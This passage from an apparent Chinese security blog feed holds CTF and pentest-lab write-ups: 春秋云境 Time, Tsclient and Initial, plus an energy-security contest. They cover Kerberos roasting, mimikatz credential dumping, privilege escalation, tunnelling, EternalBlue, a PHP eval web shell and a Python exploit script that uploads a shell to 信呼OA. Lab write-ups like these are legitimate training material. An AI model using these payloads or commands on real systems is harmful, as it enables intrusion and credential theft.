aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Time/1751623484517-2d1fb983-a67e-4c03-bbc5-0873e498127d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里可以用sqlmap一把梭，找到第二个flag</p><figure><imgsrc="/images/春秋云境-Time/1751623963695-2b3bde6e-4d04-4016-bfc1-a9b4130564d4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>读取数据库中的用户表，总共有500个用户，把这些用户的名称都dump下来做成一个字典</p><figure><imgsrc="/images/春秋云境-Time/1751624137313-c4071beb-3209-4f13-b441-e0bb790b235c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line">input_csv = <span class="string">&#x27;oa_users.csv&#x27;</span></span><br><span class="line">output_txt = <span class="string">&#x27;usernames.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_csv, mode=<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">    reader = csv.DictReader(csvfile)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_txt, mode=<span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> txtfile:</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">            username = row[<span class="string">&#x27;username&#x27;</span>].replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">            txtfile.write(username + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;所有用户名已成功转换并保存到 <span class="subst">&#123;output_txt&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>枚举未设置预身份验证的账号，得到该用户的login sessionkey。这里找到了这样的用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetMPUsers -dc-ip 172.22.6.12 -userfile usernames.txt xiaorang.lab/</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Time/1751631461631-3953c7b5-ec17-4891-8db6-4bb3c868c8ce.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Time/1751631488404-5e199649-e264-4266-89b3-8dcf75989f1f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>选一个对其进行爆破，得到密码strawberry</p><figure><imgsrc="/images/春秋云境-Time/1751631636275-30ab1cb1-a699-4b01-b9f4-7cc71f02eb57.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>刚刚扫出来的另外三台主机还有172.22.6.25没用到，用上面爆破得到的账号密码远程桌面登陆</p><figure><imgsrc="/images/春秋云境-Time/1751632173613-90fe5f37-5efc-44d3-bb53-822cc5b99253.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看了大佬的wp说是这里能猜出开了自动登录，因此可以抓取密码，得到用户yuxuan的密码是Yuxuan7QbrgZ3L</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKEY_LOCAL_MACHINES\SOFTWARE\Microdoft\Windows NT\CurrentVersion\Winlogon&quot;</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Time/1751632299881-2824a881-6b01-462c-9998-f4da10fdce48.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>登录yuxuan，通过bloodhound可以分析得这里的用户yuxuan是其他域迁移过来的，存在sid滥用，因此保留了域管理员的访问权限。</p><p>上传mimikatz获取管理员账户哈希</p><figure><imgsrc="/images/春秋云境-Time/1751635233921-71cbf24e-9721-41e6-af46-f53ed7b774d8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>横向移动获取另外两台主机上的flag即可</p><figure><imgsrc="/images/春秋云境-Time/1751635240320-cb3ef246-ec09-473c-9134-f00ef1f61119.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Time/1751635153603-80f77e05-6258-4d21-a1b6-e7056255580a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Tsclient</title>
      <link href="/posts/a0288562/"/>
      <url>/posts/a0288562/</url>
      
        <content type="html"><![CDATA[<p>fscan扫出来有mssql数据库，有了账号密码</p><figure><imgsrc="/images/春秋云境-Tsclient/1749544801227-26edcf84-93ad-4be0-8974-65dc4798ae79.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用MUDT连接，先激活一下xpshell组件</p><figure><imgsrc="/images/春秋云境-Tsclient/1749544843467-35c5b77c-fe57-43e2-91c4-d1c2ef42f872.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Tsclient/1749544859253-5d555a31-4525-4b6f-8dd4-8455948a53a7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>上传SweetPotato成功提权</p><figure><imgsrc="/images/春秋云境-Tsclient/1749545508697-54edc071-a7e0-4982-a3eb-9c20c9efad2b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Tsclient/1749545521727-909d8825-1f7b-44b9-8971-084c4c1bb172.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>添加用户，开启远程登陆</p><figure><imgsrc="/images/春秋云境-Tsclient/1749546625304-f63155ab-3a61-4adc-bbe5-2cebb368ba42.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Tsclient/1749546660322-ca913e7c-4253-4a54-acd2-7d242d5e4d9b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>开启远程桌面</p><p>REG ADD HKLMServer /v fDenyTSConnections /t REG_DWORD /d 00000000/f</p><figure><imgsrc="/images/春秋云境-Tsclient/1749546349317-abb734b3-e950-4a4d-9c04-209b97ac0136.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>远程桌面连接上，找到第一个flag</p><figure><imgsrc="/images/春秋云境-Tsclient/1749546764470-b0f037e6-34c7-411b-a98c-391c442581b9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>查看ip，上传fscan扫内网</p><figure><imgsrc="/images/春秋云境-Tsclient/1749546952561-ef94e9a9-ef89-4080-a25c-58ffa7bdef5b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Tsclient/1749547198810-44b000ce-305a-42cf-901f-f124baef1c03.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到除了打下来的这台以外还有三台机器，一台域控，两台域内机器。</p><p>quser看到还有一个叫做john的用户通过rdp连接了</p><figure><imgsrc="/images/春秋云境-Tsclient/1749547450463-c650cf4c-360e-409b-bc62-b29b67e67604.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>netstat查看网络连接状态，看到是来自域内另一个主机</p><figure><imgsrc="/images/春秋云境-Tsclient/1749547632623-fb361a8b-f1f4-4224-b919-4593489218d9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>到这里歇了歇，下次再做。</p><p>上传cs的后门并执行</p><figure><imgsrc="/images/春秋云境-Tsclient/1751552663207-2a4af707-72ee-4f33-9585-9553c1b852e3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>注入进程</p><figure><imgsrc="/images/春秋云境-Tsclient/1751553038984-ae900188-89e1-4af0-a5cf-4426e8ed6ca7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Tsclient/1751553297354-c9ec5e8d-a8b7-47d8-ba96-94ed14ab4cf8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用户存在共享文件</p><figure><imgsrc="/images/春秋云境-Tsclient/1751553367199-bc31eb24-370a-4f65-9070-e13161bed524.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>底下有个文件读取一下，给了一个账号密码以及提示</p><figure><imgsrc="/images/春秋云境-Tsclient/1751553450035-06663859-53f8-4243-8714-dbc65630aac2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Tsclient/1751553575643-4cbc9553-54f1-4db7-9a94-74b69d1ff87c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用chisel搭建隧道</p><figure><imgsrc="/images/春秋云境-Tsclient/1751555173297-ffc795ac-cfbe-4f69-9cee-bf310ecb484b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Tsclient/1751555211504-85e3af18-dfd2-44c3-a66a-460379acdca0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>配置proxychains4</p><figure><imgsrc="/images/春秋云境-Tsclient/1751555466355-c8a0f6e0-ad1d-4bae-90ac-9fbc6db78408.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>密钥喷洒发现密码过期了</p><figure><imgsrc="/images/春秋云境-Tsclient/1751556241216-0a1e1feb-fbf1-4249-9172-e895f91f9816.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>随便选一台机器rdesktop登录修改密码</p><figure><imgsrc="/images/春秋云境-Tsclient/1751559688647-dee5f629-4e8a-43fb-8292-bb3cf0f3733b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>经过尝试，能远程桌面连接上172.22.8.46</p><figure><imgsrc="/images/春秋云境-Tsclient/1751560304785-6227dacb-d0c3-4069-a02c-d1bf6e0be609.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据前面的提示映像劫持提权，这里把用cmd把放大镜劫持了</p><figure><imgsrc="/images/春秋云境-Tsclient/1751560849422-9f9569d3-4ccc-4745-9496-593aac93e5e3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Tsclient/1751560992623-1ea27905-edf8-40a4-96bc-54eac266d09b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>读到第二个flag</p><figure><imgsrc="/images/春秋云境-Tsclient/1751561148455-9838815e-6897-4a9d-a133-1a2fdf511876.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>由于172.22.8.46不出网，所以利用我们一开始得到的172.22.8.18进行转发</p><figure><imgsrc="/images/春秋云境-Tsclient/1751562009347-9733bf3f-2150-409a-a5e3-3683df86b775.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Tsclient/1751562068414-91533b4a-a186-476a-99c9-e84c0e9a3be7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>上传后门后，用放大镜执行上线</p><figure><imgsrc="/images/春秋云境-Tsclient/1751562719348-db5bd34d-9311-4f35-9100-76b9238be0c5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Tsclient/1751562732837-6d792bdc-50aa-4ea3-9305-f8774f9cc26c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用logonpassword读密码哈希</p><figure><imgsrc="/images/春秋云境-Tsclient/1751563183392-324acce8-e596-4593-a37c-bab397b47e95.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>读取域控中的flag3</p><figure><imgsrc="/images/春秋云境-Tsclient/1751563275876-3e163f63-1069-4723-9a83-342d9e9cfbb1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>能源安全大赛2025 线下个人赛 Writeup</title>
      <link href="/posts/70e1ab73/"/>
      <url>/posts/70e1ab73/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次没有得奖（</p><p>做出来了一半的题目，都是各个方向比较基本的题。有一题比较遗憾，由于时间原因倒在了出答案的前一步，不然应该就能拿到奖了（</p><p>这次又成功面基了几位星盟的师傅:)</p></blockquote><h2 id="crypto">Crypto</h2><h3 id="crypto1">crypto1</h3><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611141724525.png"alt="image-20250611141724525" /><figcaption aria-hidden="true">image-20250611141724525</figcaption></figure><h2 id="misc">Misc</h2><h3 id="misc1">Misc1</h3><p>找到一个表格</p><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611145806448.png"alt="image-20250611145820652" /><figcaption aria-hidden="true">image-20250611145820652</figcaption></figure><p>在cmdscan中找到密码</p><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611145820652.png"alt="image-20250611145820652" /><figcaption aria-hidden="true">image-20250611145820652</figcaption></figure><p>隐藏文字</p><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611145840515.png"alt="image-20250611145840515" /><figcaption aria-hidden="true">image-20250611145840515</figcaption></figure><p>UTF-7</p><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611145857308.png"alt="image-20250611145857308" /><figcaption aria-hidden="true">image-20250611145857308</figcaption></figure><h2 id="crypto-1">Crypto</h2><h3 id="crypto1-1">Crypto1</h3><p>指数很小，爆破就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">9331325916036496612720813635922258035280962812992949586840145674164931051507600783789222980650176801919878600008643559216407763411533381234754171656299952289485028219127499891446457980739880461801890066726815374085563241886502309603183517843971285910052682542705013995628247954433468290745754199412881437411777891574490057137629485620115289094683102035475398915574059262765896935379748656492856004785117045079626386247035599661222935314413011519444769248107459759626648279572026208123179461763420796830122427190346400314574131156043087120075574913622223256012491825087947617980946132161412689663223484529796601271669</span></span><br><span class="line">c=<span class="number">45813346553120339470546264839573727577613949890359259620643471628392544629545454263194106027982548197011906833972057699787601586240826324985400939459306544858311169167106946260654568561889351201677896567063863459026265644400343332540935777985483382482472619549739049322526898002346440133407204414568758274546315355805983558222739554456068747662550256387360198874718445692847249323124154673047096615131508473530675320993264913490803760236357447664365987277808708963716872977673069022818569339529270326421111157396120215952953391235896244421724611278780423573836983481421895562793258103865344</span></span><br><span class="line">e=<span class="number">13</span></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    mm=c+n*k</span><br><span class="line">    res,flag=gmpy2.iroot(mm,e)</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span>==flag:</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(res))</span><br><span class="line">    k+=<span class="number">1</span></span><br><span class="line"><span class="comment">#b&#x27;fa&#123;b994dt&#125;lg1e2df0t&#x27;</span></span><br></pre></td></tr></table></figure><p>栅栏加密</p><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611153538516.png"alt="image-20250611153538516" /><figcaption aria-hidden="true">image-20250611153538516</figcaption></figure><h2 id="ics">ICS</h2><h3 id="ics3">ICS3</h3><p>追踪TCP流，发现每个流倒数第三行的最后那里的字母连起来就是flag（如下stream9和stream11是f和l）</p><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611155357276.png"alt="image-20250611155357276" /><figcaption aria-hidden="true">image-20250611155357276</figcaption></figure><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611155408365.png"alt="image-20250611155408365" /><figcaption aria-hidden="true">image-20250611155408365</figcaption></figure><h3 id="isc4">ISC4</h3><p>查找FC是15但是address是4开头的就找到了</p><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611162633359.png"alt="image-20250611162633359" /><figcaption aria-hidden="true">image-20250611162633359</figcaption></figure><h2 id="web">Web</h2><h3 id="web1">Web1</h3><p>说是文件上传，那么盲猜上传的地方是/upload.php</p><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611163455407.png"alt="image-20250611163455407" /><figcaption aria-hidden="true">image-20250611163455407</figcaption></figure><p>上传一个普通图片，然后抓个包，把后缀名改为php，再在图片后面跟个一句话</p><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611163554465.png"alt="image-20250611163554465" /><figcaption aria-hidden="true">image-20250611163554465</figcaption></figure><p>蚁剑连接</p><figure><imgsrc="/images/能源安全大赛2025-线下个人赛-Writeup/image-20250611163657857.png"alt="image-20250611163657857" /><figcaption aria-hidden="true">image-20250611163657857</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 能源安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Initial</title>
      <link href="/posts/c1334500/"/>
      <url>/posts/c1334500/</url>
      
        <content type="html"><![CDATA[<p>先上fscan扫一遍，扫出thinkphp一个rce的洞</p><figure><imgsrc="/images/春秋云境-Initial/1749206268708-2d6f2544-e29c-432d-a5bf-a7ae7d4ccac6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用工具，getshell</p><figure><imgsrc="/images/春秋云境-Initial/1749206453409-442aafc9-c62a-4267-8408-fea19e18e254.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写个马进去</p><figure><imgsrc="/images/春秋云境-Initial/1749207569606-85ba01f6-fe85-4a32-a449-0223ebe5d527.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>蚁剑连接</p><figure><imgsrc="/images/春秋云境-Initial/1749207618780-0fd43bd7-0bf8-41ec-ba8d-da9ad3903648.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Initial/1749207665392-04afcbb3-0d0f-431d-9765-59030d75a592.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>当前用户是www-data，需要提权</p><p>发现可以sudo提权，mysql被配置了root权限，去gtfobins上查一下</p><figure><imgsrc="/images/春秋云境-Initial/1749207813416-b4cc8388-883b-412d-853c-57a72163c2f4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Initial/1749207857536-c5bd1540-64c0-4513-ba39-064f9cb00620.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>查找所有名字含flag的文件，找到flag01.txt</p><figure><imgsrc="/images/春秋云境-Initial/1749208381490-b667f738-9fe1-427a-a4f8-ee29be2410ff.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Initial/1749208422413-b9746b7c-e7bf-4d70-8366-1b1e83a90a00.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看下内网ip</p><figure><imgsrc="/images/春秋云境-Initial/1749210701594-53fa0119-5d24-47f0-af1a-4954035dbfae.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用蚁剑传个fscan上去扫描一下（记得chmod 777 fscan）</p><figure><imgsrc="/images/春秋云境-Initial/1749215898261-6a8c5cc5-63f6-446d-875f-67d1404aa4f9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到除了我们打下来的这台主机外，还有三台主机：一台是信呼OA服务器，一台是DC域控，一台是个有永恒之蓝的洞的windows</p><p>接下来配置frp转发流量</p><p>frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">serverAddr = &quot;60.204.245.37&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[socks_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port =6000</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><p>frps.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bindPort = 7000</span><br></pre></td></tr></table></figure><p>frpc通过蚁剑上传，frps上传到自己的vps上</p><figure><imgsrc="/images/春秋云境-Initial/1749217425334-edf443f6-cb69-4f42-b994-6347fbe50309.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用msf弹shell</p><figure><imgsrc="/images/春秋云境-Initial/1749231433589-6d412d74-e775-48fe-a731-119aa355674c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>将reverse.elf用蚁剑上传</p><figure><imgsrc="/images/春秋云境-Initial/1749231468914-cec1c1dc-2a0d-4b27-973a-be0a0a99e4e2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Initial/1749231448816-dc23ddbb-af90-47f7-b9da-55231c267067.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Initial/1749231592809-829c3271-286b-467e-a007-cc2e3dceff67.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>自己电脑上用proxifier代理</p><figure><imgsrc="/images/春秋云境-Initial/1749231690003-bafa3cfc-e462-46e9-a0d4-5e50ddce1023.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>代理规则</p><figure><imgsrc="/images/春秋云境-Initial/1749232113631-bfe75ab9-9948-427e-9a6b-20eb4f54179a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>先看信呼OA，用admin/admin123弱口令登录成功</p><figure><imgsrc="/images/春秋云境-Initial/1749475325786-bed8acd4-ee7e-4b55-be65-51608bd4c10a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用现成脚本打，先放一个一句话木马1.php与脚本保存在同一路径下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">import requests</span><br><span class="line">session = requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.<span class="title function_ invoke__">post</span>(url1, data=data1)</span><br><span class="line">r = session.<span class="title function_ invoke__">post</span>(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line">filepath = <span class="title function_ invoke__">str</span>(r.<span class="title function_ invoke__">json</span>()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line">id = r.<span class="title function_ invoke__">json</span>()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="keyword">print</span>(id)</span><br><span class="line"><span class="keyword">print</span>(filepath)</span><br><span class="line">url3 = url_pre + f<span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span></span><br><span class="line">r = session.<span class="title function_ invoke__">get</span>(url3)</span><br><span class="line">r = session.<span class="title function_ invoke__">get</span>(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Initial/1749475563878-5f0d4de0-5e40-4a58-a9da-2b11903d8fdc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在蚁剑上配置一下代理，然后连接</p><figure><imgsrc="/images/春秋云境-Initial/1749475729653-fe269c93-cfd3-42c7-a429-f428c08c8db8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在C:/Users/Administrator/flag/flag02.txt找到第二段flag</p><figure><imgsrc="/images/春秋云境-Initial/1749475856401-ace247b8-87a6-420b-93f1-7b5c4ce672e0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>给kali配置一下代理</p><figure><imgsrc="/images/春秋云境-Initial/1749476022346-85c27bbb-6b3f-4e57-b926-cb6eac027482.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Initial/1749476008958-fe703602-1b9d-4583-b7a3-e5c03eae7e61.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后用msf中现成的poc打win7的永恒之蓝</p><figure><imgsrc="/images/春秋云境-Initial/1749476094210-465a863d-e9df-4470-b07d-060bb3396f22.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Initial/1749476326662-526ccb07-8b6d-4e9f-983d-fa51f5e5c36d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Initial/1749476337410-6804d620-765c-4485-b7d1-62c762094cb1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用mimikatz收集域内用户哈希</p><figure><imgsrc="/images/春秋云境-Initial/1749476437992-8f97dfde-4607-43d8-bb6b-af75ec39a22a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>最后用crackmapexec横向移动拿下域控，盲猜flag路径跟信呼OA的一样</p><figure><imgsrc="/images/春秋云境-Initial/1749476705698-02f629d5-3294-4b5d-ab18-5d388c5ad83c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-漏洞靶标</title>
      <link href="/posts/3d82d740/"/>
      <url>/posts/3d82d740/</url>
      
